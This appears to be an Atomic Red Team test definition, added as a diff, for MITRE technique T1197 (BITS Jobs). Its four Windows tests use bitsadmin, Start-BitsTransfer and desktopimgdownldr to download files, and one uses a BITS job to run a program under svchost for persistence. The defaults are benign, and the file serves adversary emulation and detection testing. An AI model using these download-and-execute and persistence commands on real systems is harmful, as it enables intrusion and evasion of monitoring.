@@ -1,0 +1,142 @@
+{
+  "attack_technique": "T1197",
+  "display_name": "BITS Jobs",
+  "atomic_tests": [
+    {
+      "name": "Bitsadmin Download (cmd)",
+      "description": "This test simulates an adversary leveraging bitsadmin.exe to download\nand execute a payload",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "command_prompt",
+        "elevation_required": false,
+        "cleanup_command": "del #{local_file} >nul 2>&1",
+        "procedure": "bitsadmin.exe /transfer /Download /priority Foreground #{remote_file} #{local_file}"
+      },
+      "input_arguments": [
+        {
+          "arg_name": "remote_file",
+          "description": "Remote file to download",
+          "type": "url",
+          "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md"
+        },
+        {
+          "arg_name": "local_file",
+          "description": "Local file path to save downloaded file",
+          "type": "path",
+          "default": "%temp%\\bitsadmin1_flag.ps1"
+        }
+      ],
+      "auto_generated_guid": "3c73d728-75fb-4180-a12f-6712864d7421"
+    },
+    {
+      "name": "Bitsadmin Download (PowerShell)",
+      "description": "This test simulates an adversary leveraging bitsadmin.exe to download\nand execute a payload leveraging PowerShell\n\nUpon execution you will find a github markdown file downloaded to the Temp directory",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "powershell",
+        "elevation_required": false,
+        "cleanup_command": "Remove-Item #{local_file} -ErrorAction Ignore",
+        "procedure": "Start-BitsTransfer -Priority foreground -Source #{remote_file} -Destination #{local_file}"
+      },
+      "input_arguments": [
+        {
+          "arg_name": "remote_file",
+          "description": "Remote file to download",
+          "type": "url",
+          "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md"
+        },
+        {
+          "arg_name": "local_file",
+          "description": "Local file path to save downloaded file",
+          "type": "path",
+          "default": "$env:TEMP\\bitsadmin2_flag.ps1"
+        }
+      ],
+      "auto_generated_guid": "f63b8bc4-07e5-4112-acba-56f646f3f0bc"
+    },
+    {
+      "name": "Persist, Download, & Execute",
+      "description": "This test simulates an adversary leveraging bitsadmin.exe to schedule a BITS transferand execute a payload in multiple steps.\nNote that in this test, the file executed is not the one downloaded. The downloading of a random file is simply the trigger for getting bitsdamin to run an executable.\nThis has the interesting side effect of causing the executable (e.g. notepad) to run with an Initiating Process of \"svchost.exe\" and an Initiating Process Command Line of \"svchost.exe -k netsvcs -p -s BITS\"\nThis job will remain in the BITS queue until complete or for up to 90 days by default if not removed.",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "command_prompt",
+        "elevation_required": false,
+        "cleanup_command": "del #{local_file} >nul 2>&1",
+        "procedure": "bitsadmin.exe /create #{bits_job_name}\nbitsadmin.exe /addfile #{bits_job_name} #{remote_file} #{local_file}\nbitsadmin.exe /setnotifycmdline #{bits_job_name} #{command_path} NULL\nbitsadmin.exe /resume #{bits_job_name}\nping -n 5 127.0.0.1 >nul 2>&1\nbitsadmin.exe /complete #{bits_job_name}"
+      },
+      "input_arguments": [
+        {
+          "arg_name": "command_path",
+          "description": "Path of command to execute",
+          "type": "path",
+          "default": "C:\\Windows\\system32\\notepad.exe"
+        },
+        {
+          "arg_name": "bits_job_name",
+          "description": "Name of BITS job",
+          "type": "string",
+          "default": "AtomicBITS"
+        },
+        {
+          "arg_name": "local_file",
+          "description": "Local file path to save downloaded file",
+          "type": "path",
+          "default": "%temp%\\bitsadmin3_flag.ps1"
+        },
+        {
+          "arg_name": "remote_file",
+          "description": "Remote file to download",
+          "type": "url",
+          "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md"
+        }
+      ],
+      "auto_generated_guid": "62a06ec5-5754-47d2-bcfc-123d8314c6ae"
+    },
+    {
+      "name": "Bits download using desktopimgdownldr.exe (cmd)",
+      "description": "This test simulates using desktopimgdownldr.exe to download a malicious file\ninstead of a desktop or lockscreen background img. The process that actually makes \nthe TCP connection and creates the file on the disk is a svchost process (“-k netsvc -p -s BITS”) \nand not desktopimgdownldr.exe. See https://labs.sentinelone.com/living-off-windows-land-a-new-native-file-downldr/",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "command_prompt",
+        "elevation_required": false,
+        "cleanup_command": "del #{cleanup_path}\\#{cleanup_file} >nul 2>&1",
+        "procedure": "set \"#{download_path}\" && cmd /c desktopimgdownldr.exe /lockscreenurl:#{remote_file} /eventName:desktopimgdownldr"
+      },
+      "input_arguments": [
+        {
+          "arg_name": "remote_file",
+          "description": "Remote file to download",
+          "type": "url",
+          "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md"
+        },
+        {
+          "arg_name": "download_path",
+          "description": "Local file path to save downloaded file",
+          "type": "path",
+          "default": "SYSTEMROOT=C:\\Windows\\Temp"
+        },
+        {
+          "arg_name": "cleanup_path",
+          "description": "path to delete file as part of cleanup_command",
+          "type": "path",
+          "default": "C:\\Windows\\Temp\\Personalization\\LockScreenImage"
+        },
+        {
+          "arg_name": "cleanup_file",
+          "description": "file to remove as part of cleanup_command",
+          "type": "string",
+          "default": "*.md"
+        }
+      ],
+      "auto_generated_guid": "afb5e09e-e385-4dee-9a94-6ee60979d114"
+    }
+  ]
+}
